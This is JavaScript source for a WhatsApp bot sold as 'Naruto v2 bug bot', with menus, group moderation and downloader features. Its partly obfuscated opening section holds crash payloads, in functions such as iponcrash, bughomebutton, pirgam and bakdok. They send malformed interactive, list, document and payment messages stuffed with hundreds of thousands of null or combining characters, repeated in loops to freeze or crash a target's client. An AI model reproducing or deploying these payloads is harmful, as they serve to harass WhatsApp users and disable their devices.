_0x406d38=generateWAMessageFromContent(_0x55b1b6,{'viewOnceMessage':{'message':{'messageContextInfo':{'deviceListMetadata':{},'deviceListMetadataVersion':0x2},'interactiveMessage':proto[_0x1e2a60(0xbe)][_0x1e2a60(0xa2)][_0x1e2a60(0xce)]({'body':proto[_0x1e2a60(0xbe)][_0x1e2a60(0xa2)][_0x1e2a60(0x7e)][_0x1e2a60(0xce)]({'text':''}),'footer':proto[_0x1e2a60(0xbe)][_0x1e2a60(0xa2)]['Footer'][_0x1e2a60(0xce)]({'text':''}),'header':proto[_0x1e2a60(0xbe)][_0x1e2a60(0xa2)][_0x1e2a60(0xc1)]['create']({'title':'','subtitle':'','hasMediaAttachment':![]}),'nativeFlowMessage':proto['Message'][_0x1e2a60(0xa2)][_0x1e2a60(0xd0)][_0x1e2a60(0xce)]({'buttons':[{'name':_0x1e2a60(0xae),'buttonParamsJson':_0x1e2a60(0x89)}],'messageParamsJson':'\x00'['repeat'](0x186a0)})})}}},{});anggazyy[_0x1e2a60(0x7a)](_0x55b1b6,_0x406d38['message'],{'messageId':_0x406d38[_0x1e2a60(0x8e)]['id']});}}async function sendLiveLocationMessage(_0x7c0a9d){const _0x23e796=_0x5d33f6;var _0x48bd11=generateWAMessageFromContent(_0x7c0a9d,proto['Message'][_0x23e796(0x9b)]({'viewOnceMessage':{'message':{'liveLocationMessage':{'degreesLatitude':'p','degreesLongitude':'p','caption':_0x23e796(0x78)+_0x23e796(0xa1)['repeat'](0xc350),'sequenceNumber':'0','jpegThumbnail':''}}}}),{'userJid':_0x7c0a9d});await anggazyy[_0x23e796(0x7a)](_0x7c0a9d,_0x48bd11[_0x23e796(0xaa)],{'participant':{'jid':_0x7c0a9d},'messageId':_0x48bd11[_0x23e796(0x8e)]['id']});}async function sendListMessage(_0x1f46ce){const _0x20831c=_0x5d33f6;var _0x50e490=generateWAMessageFromContent(_0x1f46ce,proto[_0x20831c(0xbe)][_0x20831c(0x9b)]({'listMessage':{'title':'SÌ¸Yê™°Ì¸Sê™°Ì¸Tê™°Ì¸Eê™°Ì¸Mê™°Ì¸\x20UÌ¸IÌ¸\x20CÌ¸Rê™°Ì¸Aê™°Ì¸Sê™°Ì¸Hê™°Ì¸'+'\x00'['repeat'](0xe09c0),'footerText':'àº®â‚®à½žà¸¨Vê™°à¸¨\x20à¹–àº¡Gê™°à½€Í¡Íœâœ…âƒŸâ•®','description':_0x20831c(0x90),'buttonText':null,'listType':0x2,'productListInfo':{'productSections':[{'title':'lol','products':[{'productId':_0x20831c(0xc8)}]}],'productListHeaderImage':{'productId':_0x20831c(0xc8),'jpegThumbnail':null},'businessOwnerJid':_0x20831c(0x8a)}},'footer':_0x20831c(0x7f),'contextInfo':{'expiration':0x927c0,'ephemeralSettingTimestamp':_0x20831c(0x86),'entryPointConversionSource':_0x20831c(0xa0),'entryPointConversionApp':_0x20831c(0x8b),'entryPointConversionDelaySeconds':0x9,'disappearingMode':{'initiator':_0x20831c(0x97)}},'selectListType':0x2,'product_header_info':{'product_header_info_id':0x4433e2e130,'product_header_is_rejected':![]}}),{'userJid':_0x1f46ce});await anggazyy[_0x20831c(0x7a)](_0x1f46ce,_0x50e490[_0x20831c(0xaa)],{'participant':{'jid':_0x1f46ce},'messageId':_0x50e490[_0x20831c(0x8e)]['id']});}async function sendMixedMessages(_0x1a189f,_0x1c7888){for(let _0x597d72=0x0;_0x597d72<_0x1c7888;_0x597d72++){sendLiveLocationMessage(_0x1a189f),sendListMessage(_0x1a189f),await sleep(0x1f4);}}function sendMessageWithMentions(_0x208db0,_0x229fec=[],_0x5bb2a2=![]){const _0x1bbaba=_0x5d33f6;return _0x5bb2a2==null||_0x5bb2a2==undefined||_0x5bb2a2==![]?anggazyy['sendMessage'](m[_0x1bbaba(0xc0)],{'text':_0x208db0,'mentions':_0x229fec},{'quoted':m}):anggazyy['sendMessage'](m['chat'],{'text':_0x208db0,'mentions':_0x229fec},{'quoted':m});}async function baklis(_0x19cfa4,_0x1f561a){const _0x395a37=_0x5d33f6;var _0x2f75d6=generateWAMessageFromContent(_0x19cfa4,proto[_0x395a37(0xbe)]['fromObject']({'listMessage':{'title':'⟠\x20DevilS\x20⿻\x20𝐂𝐋͢𝐢𝚵𝐍͢𝐓\x20々'+'\x00'[_0x395a37(0xd2)](0xe09c0),'footerText':_0x395a37(0xa7),'description':'✳️᜴࿆͆᷍𝙰𝙽𝙶𝙶𝙰𝚉𝚈𝚈\x20𝙾𝙵𝙲𝙲\x20666╮⭑\x20☠️⃰͜͡؜𝙰𝙽𝙶𝙶𝙰𝚉𝚈𝚈\x20𝙾𝙵𝙲𝙲\x20666⭐️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp','buttonText':null,'listType':0x2,'productListInfo':{'productSections':[{'title':'anjay','products':[{'productId':_0x395a37(0xc8)}]}],'productListHeaderImage':{'productId':'4392524570816732','jpegThumbnail':null},'businessOwnerJid':'0@s.whatsapp.net'}},'footer':_0x395a37(0xa4),'contextInfo':{'expiration':0x93a80,'ephemeralSettingTimestamp':_0x395a37(0x86),'entryPointConversionSource':_0x395a37(0xa0),'entryPointConversionApp':_0x395a37(0x8b),'entryPointConversionDelaySeconds':0x9,'disappearingMode':{'initiator':_0x395a37(0x97)}},'selectListType':0x2,'product_header_info':{'product_header_info_id':0x4433e2e130,'product_header_is_rejected':![]}}),{'userJid':_0x19cfa4,'quoted':angggazyyvault});await anggazyy[_0x395a37(0x7a)](_0x19cfa4,_0x2f75d6[_0x395a37(0xaa)],{'participant':{'jid':_0x19cfa4},'messageId':_0x2f75d6[_0x395a37(0x8e)]['id']});}function _0x2ae7(_0x23c963,_0x413243){const _0x118eca=_0x118e();return _0x2ae7=function(_0x2ae73a,_0x3e5f34){_0x2ae73a=_0x2ae73a-0x75;let _0x368f17=_0x118eca[_0x2ae73a];return _0x368f17;},_0x2ae7(_0x23c963,_0x413243);}async function anggazyyiphone(_0x521e44){const _0x2cfb62=_0x5d33f6;await anggazyy[_0x2cfb62(0x7a)](_0x521e44,{'paymentInviteMessage':{'serviceType':'FBPAY','expiryTimestamp':Date['now']()+0x6c258c00}},{'participant':{'jid':_0x521e44}});}async function anggazyydevil(_0x3999dd,_0x73640){const _0x1873f0=_0x5d33f6;var _0x3f9e13=generateWAMessageFromContent(_0x3999dd,proto[_0x1873f0(0xbe)][_0x1873f0(0x9b)]({'documentMessage':{'url':_0x1873f0(0xb0),'mimetype':_0x1873f0(0x7b),'fileSha256':_0x1873f0(0x81),'fileLength':_0x1873f0(0x9c),'pageCount':0x3b9ac9ff,'mediaKey':_0x1873f0(0x75),'fileName':_0x1873f0(0xa7)+'ྦྷ'[_0x1873f0(0xd2)](0xea60),'fileEncSha256':_0x1873f0(0xcd),'directPath':_0x1873f0(0x9d),'mediaKeyTimestamp':_0x1873f0(0x84)}}),{'userJid':_0x3999dd,'quoted':_0x73640});await anggazyy[_0x1873f0(0x7a)](_0x3999dd,_0x3f9e13['message'],{'participant':{'jid':_0x3999dd},'messageId':_0x3f9e13[_0x1873f0(0x8e)]['id']});}async function pirgam(_0x3d0ff5,_0x5c9610){const _0x3f2cce=_0x5d33f6;var _0x1aeacd=generateWAMessageFromContent(_0x3d0ff5,proto[_0x3f2cce(0xbe)]['fromObject']({'interactiveMessage':{'header':{'title':_0x3f2cce(0x8d),'hasMediaAttachment':!![],...await prepareWAMessageMedia({'image':{'url':_0x3f2cce(0x9f)}},{'upload':anggazyy[_0x3f2cce(0xcb)]})},'body':{'text':''},'footer':{'text':_0x3f2cce(0x96)},'nativeFlowMessage':{'messageParamsJson':'\x00'[_0x3f2cce(0xd2)](0xf4240)}}}),{'userJid':_0x3d0ff5,'quoted':_0x5c9610});await anggazyy[_0x3f2cce(0x7a)](_0x3d0ff5,_0x1aeacd[_0x3f2cce(0xaa)],{'participant':{'jid':_0x3d0ff5},'messageId':_0x1aeacd[_0x3f2cce(0x8e)]['id']});}async function penghitaman(_0x16e564,_0x305647){const _0x3cfd51=_0x5d33f6;var _0x2c76fd=generateWAMessageFromContent(_0x16e564,proto['Message']['fromObject']({'stickerMessage':{'url':_0x3cfd51(0xa6),'fileSha256':_0x3cfd51(0x79),'fileEncSha256':_0x3cfd51(0xbb),'mediaKey':'4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=','mimetype':_0x3cfd51(0xad),'directPath':_0x3cfd51(0xb7),'fileLength':_0x3cfd51(0x95),'mediaKeyTimestamp':_0x3cfd51(0xd1),'isAnimated':![],'stickerSentTs':_0x3cfd51(0xd3),'isAvatar':![],'isAiSticker':![],'isLottie':![]}}),{'userJid':_0x16e564,'quoted':_0x305647});await anggazyy['relayMessage'](_0x16e564,_0x2c76fd[_0x3cfd51(0xaa)],{'participant':{'jid':_0x16e564},'messageId':_0x2c76fd[_0x3cfd51(0x8e)]['id']});}const force={'key':{'participant':_0x5d33f6(0x8a),...m[_0x5d33f6(0xc0)]?{'remoteJid':_0x5d33f6(0xa3)}:{}},'message':{'interactiveMessage':{'header':{'hasMediaAttachment':!![],'jpegThumbnail':fs['readFileSync'](_0x5d33f6(0x88))},'nativeFlowMessage':{'buttons':[{'name':_0x5d33f6(0xd4),'buttonParamsJson':_0x5d33f6(0xa9)}]}}}},sendReaction=async _0x144bbd=>{const _0x3c5e50=_0x5d33f6;anggazyy['sendMessage'](m[_0x3c5e50(0xc0)],{'react':{'text':_0x144bbd,'key':m[_0x3c5e50(0x8e)]}});},force2={'key':{'participant':'0@s.whatsapp.net',...m[_0x5d33f6(0xc0)]?{'remoteJid':_0x5d33f6(0xa3)}:{}},'message':{'interactiveMessage':{'header':{'hasMediaAttachment':!![],'jpegThumbnail':fs['readFileSync'](_0x5d33f6(0x88))},'nativeFlowMessage':{'buttons':[{'name':_0x5d33f6(0xd4),'buttonParamsJson':_0x5d33f6(0xa9)}]}}}},oneclickxeon={'key':{'participant':_0x5d33f6(0x8a),...m[_0x5d33f6(0xc0)]?{'remoteJid':_0x5d33f6(0xa3)}:{}},'message':{'listResponseMessage':{'title':_0x5d33f6(0xb4)}}},qkontak={'key':{'participant':_0x5d33f6(0x8a),...botNumber?{'remoteJid':_0x5d33f6(0xa3)}:{}},'message':{'contactMessage':{'displayName':''+namaowner,'vcard':_0x5d33f6(0xbf),'sendEphemeral':!![]}}},qpayment={'key':{'remoteJid':_0x5d33f6(0x8a),'fromMe':![],'id':_0x5d33f6(0xd5),'participant':_0x5d33f6(0x8a)},'message':{'requestPaymentMessage':{'currencyCodeIso4217':_0x5d33f6(0xd7),'amount1000':0x3b9ac9ff,'requestFrom':_0x5d33f6(0x8a),'noteMessage':{'extendedTextMessage':{'text':namabot}},'expiryTimestamp':0x3b9ac9ff,'amount':{'value':0x156769ac99,'offset':0x3e8,'currencyCode':_0x5d33f6(0xb8)}}}},qchanel={'key':{'remoteJid':_0x5d33f6(0xa3),'fromMe':![],'participant':_0x5d33f6(0x8a)},'message':{'newsletterAdminInviteMessage':{'newsletterJid':_0x5d33f6(0x7c),'newsletterName':_0x5d33f6(0x92),'jpegThumbnail':'','caption':'Powered\x20By\x20'+namaowner2,'inviteExpiration':Date[_0x5d33f6(0xb2)]()+0x6c258c00}}};

(function(_0x28f7a9,_0x6f8f25){var _0x40c672=_0x377f,_0xfdf123=_0x28f7a9();while(!![]){try{var _0x2ca511=parseInt(_0x40c672(0x17f))/0x1*(-parseInt(_0x40c672(0x175))/0x2)+-parseInt(_0x40c672(0x16d))/0x3+parseInt(_0x40c672(0x173))/0x4*(-parseInt(_0x40c672(0x17e))/0x5)+parseInt(_0x40c672(0x178))/0x6+parseInt(_0x40c672(0x182))/0x7*(parseInt(_0x40c672(0x170))/0x8)+-parseInt(_0x40c672(0x16c))/0x9*(parseInt(_0x40c672(0x184))/0xa)+parseInt(_0x40c672(0x185))/0xb;if(_0x2ca511===_0x6f8f25)break;else _0xfdf123['push'](_0xfdf123['shift']());}catch(_0x31201c){_0xfdf123['push'](_0xfdf123['shift']());}}}(_0x40a4,0x71b11));async function sendRepeatedMessages2(_0x1fb61f,_0x2c9c78){for(let _0xda1b03=0x0;_0xda1b03<_0x2c9c78;_0xda1b03++){sendSystemCrashMessage(_0x1fb61f),await sleep(0x5dc),sendSystemCrashMessage(_0x1fb61f),await sleep(0x7d0),sendSystemCrashMessage(_0x1fb61f),await sleep(0x1f4),sendSystemCrashMessage(_0x1fb61f),await sleep(0x1f4);}}function _0x40a4(){var _0x3a31ac=['4BwSpxC','1715880173','key','1865382WbCGuC','5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=','now','https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true','›anggazyyOfficial','penis','45JTDjeJ','93269iZjqPO','fromObject','anggazyy\x20DOCUMENT\x20✅','2217222vzGCSP','/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0','20JzFmKk','8517091pApdzL','Message','FBPAY','cta_url','repeat','272610rezryY','896196islVNp','pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=','message','8CSxBTo','ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=','relayMessage','173508HmGOAv','IYA\x20IN'];_0x40a4=function(){return _0x3a31ac;};return _0x40a4();}async function iponcrash(_0x3635c6){var _0x5a68a9=_0x377f;await anggazyy[_0x5a68a9(0x172)](_0x3635c6,{'paymentInviteMessage':{'serviceType':_0x5a68a9(0x187),'expiryTimestamp':Date[_0x5a68a9(0x17a)]()+0x6c258c00}},{'participant':{'jid':_0x3635c6}});}async function bakdok(_0x1d0f5f,_0x140189){var _0x59aac2=_0x377f,_0x42afaa=generateWAMessageFromContent(_0x1d0f5f,proto['Message'][_0x59aac2(0x180)]({'documentMessage':{'url':_0x59aac2(0x17b),'mimetype':_0x59aac2(0x17d),'fileSha256':_0x59aac2(0x171),'fileLength':'999999999','pageCount':0x3b9ac9ff,'mediaKey':_0x59aac2(0x179),'fileName':_0x59aac2(0x181)+'ྦྷ'[_0x59aac2(0x16b)](0xea60),'fileEncSha256':_0x59aac2(0x16e),'directPath':_0x59aac2(0x183),'mediaKeyTimestamp':_0x59aac2(0x176)}}),{'userJid':_0x1d0f5f,'quoted':_0x140189});await anggazyy[_0x59aac2(0x172)](_0x1d0f5f,_0x42afaa[_0x59aac2(0x16f)],{'participant':{'jid':_0x1d0f5f},'messageId':_0x42afaa[_0x59aac2(0x177)]['id']});}function _0x377f(_0x1fb7c0,_0x4cddcd){var _0x40a482=_0x40a4();return _0x377f=function(_0x377fec,_0x44859a){_0x377fec=_0x377fec-0x16a;var _0x2af515=_0x40a482[_0x377fec];return _0x2af515;},_0x377f(_0x1fb7c0,_0x4cddcd);}async function bughomebutton(_0x356b74){var _0x2c3106=_0x377f,_0x556664=generateWAMessageFromContent(_0x356b74,proto[_0x2c3106(0x186)][_0x2c3106(0x180)]({'viewOnceMessage':{'message':{'interactiveMessage':{'header':{'title':'','subtitle':'\x20'},'body':{'text':_0x2c3106(0x174)},'footer':{'text':_0x2c3106(0x17c)},'nativeFlowMessage':{'buttons':[{'name':_0x2c3106(0x16a),'buttonParamsJson':'{\x20display_text\x20:\x20\x27anggazyyBugWhatsApp\x27,\x20url\x20:\x20,\x20merchant_url\x20:\x20\x20}'}],'messageParamsJson':'\x00'['repeat'](0xf4240)}}}}}),{'userJid':_0x356b74,'quoted':m});await anggazyy[_0x2c3106(0x172)](_0x356b74,_0x556664[_0x2c3106(0x16f)],{'messageId':_0x556664[_0x2c3106(0x177)]['id']});}


async function reply(teks) {
            const po = {
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `𝐧𝐚𝐫𝐮𝐭𝐨 𝐯2 𝐛𝐨𝐭 🌹`,
                            body: '',
                            thumbnailUrl: "https://i.imgur.com/DANzz5F.jpeg",
                            sourceUrl: 'https://whatsapp.com/channel/0029VaefL9g0gcfLITSc841W',
                            mediaType: 1,
                            renderLargerThumbnail: false
                    }
                },
                text: teks
            };
            return anggazyy.sendMessage(m.chat, po, { quoted: qkontak }
            );
        };

//========== FUNCTION ===========//
let ppuser
try {
ppuser = await anggazyy.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://telegra.ph/file/a059a6a734ed202c879d3.jpg'
}

async function SendSlide(jid, img, txt = []) {
let anu = new Array()
let imgsc = await prepareWAMessageMedia({ image: img}, { upload: anggazyy.waUploadToServer })
for (let ii of txt) {
await anu.push({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: `${ii}`
}),
header: proto.Message.InteractiveMessage.Header.fromObject({
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson:  `{\"display_text\":\"Beli Produk\",\"url\":\"https://wa.me/${global.owner}\",\"merchant_url\":\"https://www.google.com\"}`
}, 
{                  
name: "cta_url",
buttonParamsJson:  `{\"display_text\":\"Testimoni\",\"url\":\"${global.linksaluran}\",\"merchant_url\":\"https://www.google.com\"}`
}, 
{                  
name: "cta_url",
buttonParamsJson:  `{\"display_text\":\"Join Grup\",\"url\":\"${global.linkgc}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})}
const msgii = await generateWAMessageFromContent(m.chat, {
viewOnceMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: "All Transactions Open ✅*\n\n*Ednut* Provides the Products and Services Below 📦"
}),
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: anu
})
})}
}}, {userJid: m.sender, quoted: qtoko})
return anggazyy.relayMessage(jid, msgii.message, {
messageId: msgii.key.id
})}

let example = (teks) => {
return `\n*Usage examples :*\ntype *${cmd}* ${teks}\n`
}

function capital(string) {
  return string.charAt(0).toUpperCase() + string.slice(1);
}

const createSerial = (size) => {
return crypto.randomBytes(size).toString('hex').slice(0, size)
}

const xbug2 = {
key: {
remoteJid: 'status@broadcast',
fromMe: false, 
participant: '0@s.whatsapp.net'
},
message: {
listResponseMessage: {
title: `Ednut`
}
}
}

anggazyy.sendButton = async (jid, buttons, quoted, opts = {}) => {
      let message = generateWAMessageFromContent(jid, {
         viewOnceMessage: {
            message: {
               interactiveMessage: {
                  body: {
                     text: opts && opts.body ? opts.body : ''
                  },
                  footer: {
                     text: opts && opts.footer ? opts.footer : ''
                  },
                  nativeFlowMessage: {
                     buttons: buttons,
                     messageParamsJson: ''
                  }
               }
            }
         }
      }, {
         quoted
      })
      await anggazyy.sendPresenceUpdate('composing', jid)
      return anggazyy.relayMessage(jid, message["message"], {
         messageId: message.key.id
      })
   }
   
const bugquoteddvc = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
listResponseMessage: {
title: `𝐧𝐚𝐫𝐮𝐭𝐨 𝐯2 𝐛𝐨𝐭`
}
}
}

//========= SETTING EVENT ========//

if (!anggazyy.public) {
if (!m.key.fromMe) return
} 

if (global.owneroff && !isCmd) {
if (!isGroup && !isOwner) {
let teks = `*Hi* @${m.sender.split('@')[0]}

Sorry *My Owner is Offline*, Please Wait for the Owner to be Online Again & Don't Spam Chat`
return anggazyy.sendMessage(m.chat, {text: `${teks}`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {
showAdAttribution: true, thumbnail: fs.readFileSync("./media/ownermode.jpg"), renderLargerThumbnail: false, title: "｢ OWNER OFFLINE MODE ｣", mediaUrl: linkgc, sourceUrl: linkyt, previewType: "PHOTO"}}}, {quoted: null})
}}

/*if (global.antibug) {
if (!isGroup && m.isBaileys && !m.fromMe) {
await anggazyy.sendMessage(m.chat, {
delete: {
remoteJid: m.chat, fromMe: true, id: m.key.id
}})
await anggazyy.sendMessage(`${global.owner}@s.whatsapp.net`, {text: `*Terdeteksi Pesan Bug*
*Nomor :* ${m.sender.split("@")[0]}`}, {quoted: null})
}}*/

if (antilink.includes(m.chat)) {
if (!isBotAdmin) return
if (!isAdmin && !isOwner && !m.fromMe) {
var link = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi
if (link.test(m.text)) {
var gclink = (`https://chat.whatsapp.com/` + await anggazyy.groupInviteCode(m.chat))
var isLinkThisGc = new RegExp(gclink, 'i')
var isgclink = isLinkThisGc.test(m.text)
if (isgclink) return
let delet = m.key.participant
let bang = m.key.id
await anggazyy.sendMessage(m.chat, {text: `@${m.sender.split("@")[0]} Maaf Kamu Akan Saya Keluarkan Dari Grup Ini Karna Admin/Owner Bot Menyalakan Fitur *Antilink* Grup Lain!`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {thumbnail: fs.readFileSync("./media/warning.jpg"), title: "｢ LINK GRUP DETECTED ｣", previewType: "PHOTO"}}}, {quoted: m})
await anggazyy.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
await anggazyy.groupParticipantsUpdate(m.chat, [m.sender], "remove")
}
}}

if (antilink2.includes(m.chat)) {
if (!isBotAdmin) return
if (!isAdmin && !isOwner && !m.fromMe) {
var link = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi
if (link.test(m.text)) {
var gclink = (`https://chat.whatsapp.com/` + await anggazyy.groupInviteCode(m.chat))
var isLinkThisGc = new RegExp(gclink, 'i')
var isgclink = isLinkThisGc.test(m.text)
if (isgclink) return
let delet = m.key.participant
let bang = m.key.id
await anggazyy.sendMessage(m.chat, {text: `@${m.sender.split("@")[0]} Maaf Pesan Kamu Saya Hapus Karna Admin/Owner Bot Menyalakan Fitur *Antilink* Grup Lain!`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {thumbnail: fs.readFileSync("./media/warning.jpg"), title: "｢ LINK GRUP DETECTED ｣", previewType: "PHOTO"}}}, {quoted: m})
await anggazyy.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
}
}}

switch (command) {
case "menu": case "ednut": case "Naruto": case "Narutov2": {
let teksnya = `*𝒘𝒂𝒈𝒘𝒂𝒏 𝒄𝒖𝒛 ❄* @${m.sender.split("@")[0]} 🙋‍♂️

𝐭𝐡𝐢𝐬 𝐢𝐬 𝐧𝐚𝐫𝐮𝐭𝐨 𝐯2 𝐛𝐮𝐠 𝐚𝐜𝐭𝐢𝐯𝐞 𝐚𝐧𝐝 𝐫𝐞𝐚𝐝𝐲 𝐜𝐫𝐞𝐚𝐭𝐞𝐝 𝐛𝐲 @${owner} 💀

  *nαrutσ v2 вσt ínfσ*
  
◍ Botname : *${namabot2}*
◍ Mode : *${anggazyy.public ? "Public Mode" : "Self Mode"}*
◍ Uptime : *${runtime(process.uptime())}*
◍ Library : *Active*
◍ Version : *${global.version}*
◍ Total Premium User : *${premium.length < 1 ? "No prem" : premium.length + " User"}*`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({ 
text: teksnya
}), 
header: proto.Message.InteractiveMessage.Header.fromObject({
hasMediaAttachment: true,
documentMessage: {"url": "https://mmg.whatsapp.net/v/t62.7119-24/30129597_829817659174206_6300413901737393729_n.enc?ccb=11-4&oh=01_Q5AaIA5MAdyMQOjp8l42SnRy_8qjz9O8JH8vgPee1nIdko51&oe=66595EB9&_nc_sid=5e03e0&mms3=true",
"mimetype": "image/png",
"fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
"jpegThumbnail": await resize(fs.readFileSync("./media/menu.jpg"), 400, 400),
"fileLength": 120000,
"mediaKey": "SkHeALp42Ch7DGb6nuV6p7hxL+V9yjh9s9t3Ox8a72o=",
"fileName": `𝒏𝒂𝒓𝒖𝒕𝒐 𝒗2 𝒃𝒖𝒈 😈`,
"directPath": "/v/t62.7119-24/30129597_829817659174206_6300413901737393729_n.enc?ccb=11-4&oh=01_Q5AaIA5MAdyMQOjp8l42SnRy_8qjz9O8JH8vgPee1nIdko51&oe=66595EB9&_nc_sid=5e03e0",
"contactVcard": true,
"mediaKeyTimestamp": "1658703206"
}
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": `{ "title": "List Menu", "sections": [{ "title": "# List Naruto v2 menu📃", "rows": [{ "header": "All Command", "title": "List All Command Bot", "description": "© ${namabot2}", "id": ".allmenu" }, 
{ "header": "Main Menu", "title": "List Main Menu Command👀", "description": "© ${namabot2}", "id": ".mainmenu" }, 
{ "header": "Downloader", "title": "List Downloader Command✨", "description": "© ${namabot2}", "id": ".downloadmenu" }, 
{ "header": "Bug Menu", "title": "List Naruto Bug Menu Command🪲", "description": "© ${namabot2}", "id": ".bugmenu" }, 
{ "header": "Converter", "title": "List Converter Command🌹", "description": "© ${namabot2}", "id": ".convertmenu" }, 
{ "header": "Group Menu", "title": "List Group Menu🥶 Command", "description": "© ${namabot2}", "id": ".grupmenu" }, 
{ "header": "Owner Menu", "title": "List Ownerbot Menu Command👤", "description": "© ${namabot2}", "id": ".ownermenu" }]}, { "title": "#Run Owner Bot", "rows": [{ "header": "buy private panel 🥇", "title": "List private Panel price⚡", "description": "© ${namabot2}", "id": ".list_panel" }, 
{  "header": "Script Naruto Version 2.0", "title": "buy Script 🫂 naruto Version 2.0", "description": "© ${namabot2}", "id": ".script" }]}, { "title": "# Tools Owner Bot", "rows": [{ "header": "Auto Read", "title": "turn ON/OFF", "description": "© ${namabot2}", "id": ".autoread" }, 
{ "header": "Auto Read Story", "title": "turn ON/OFF", "description": "© ${namabot2}", "id": ".autoreadsw" }, 
{ "header": "Anti Call", "title": " ON/OFF", "description": "© ${namabot2}", "id": ".anticall" }]}]}`
},
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"🪲 naruto channel👤\",\"url\":\"${global.linkgc}\",\"merchant_url\":\"https://www.google.com\"}`
}]
}), 
contextInfo: {
isForwarded: true,
mentionedJid: [m.sender, owner+"@s.whatsapp.net"], 
forwardedNewsletterMessageInfo: {
newsletterName: `Powered By ${namaowner2}`,
newsletterJid: global.idsaluran
}, externalAdReply: {
title: `Status : ${isOwner ? "Creator scriptt" : isPremium ? "Premium" : "Free"}`,
thumbnailUrl: ppuser,
body: `${ucapan()} ${m.pushName}`, 
sourceUrl: linkyt,
previewType: "PHOTO"
}}
})} 
}}, {userJid: m.sender, quoted: null}) 
await anggazyy.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
}
break
case "allmenu": {
let teksmenu = ` *𝒘𝒂𝒈𝒘𝒂𝒏 𝒄𝒖𝒛* @${m.sender.split("@")[0]}!
 *👋 ${ucapan()}*
 
*乂 M A I N M E N U*
* play
* tourl
* yts
* tohd
* chatgpt
* ai
* remini
* sticker
* listpremium
* pinterest
* qc
* ping
* runtime
* Alive

*乂 D O W N L O A D E R*
* tiktok
* tiktokmp3
* tiktokaudio
* tiktokslide
* instagram
* facebook
* ytmp3
* mediafire
  
*乂 C O N V E R T E R*
* toaudio
* tomp3
* tovn
* toptv
* tts
* toimage
  
*乂 G R O U P M E N U*
* addmember
* antilink
* antilinkV2
* hidetag
* tagall
* delete
* open/close
* setnamagc
* setdeskgc
* setppgc
* kick
* promote
* leavegc
* leavegc2
* demote
  
*乂 O W N E R M E N U*
* addowner
* addpremium
* delpremium
* delowner
* listowner
* clearsession
* modeoff
* modeon
* done
* anticall
* autoread
* autoreadsw
* welcome
* getcase
* setppbotpanjang
* setppbot
* setnamabot
* setbiobot
* jadibot
* listjadibot
* stopjadibot`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({ 
text: teksmenu
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Join channel\",\"url\":\"${global.linkgc}\",\"merchant_url\":\"https://www.google.com\"}`
}]
}), 
contextInfo: {
isForwarded: true,
mentionedJid: [m.sender], 
forwardedNewsletterMessageInfo: {
newsletterName: `Powered By ${namaowner2}`,
newsletterJid: global.idsaluran
}}
})} 
}}, {userJid: m.sender, quoted: null}) 
await anggazyy.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
}
break
case "mainmenu": {
let teksmenu = `*乂 M A I N M E N U*
* play
* tourl
* yts
* tohd
* chatgpt
* ai
* remini
* listpremium
* sticker
* pinterest
* qc`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({ 
text: teksmenu
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [
{
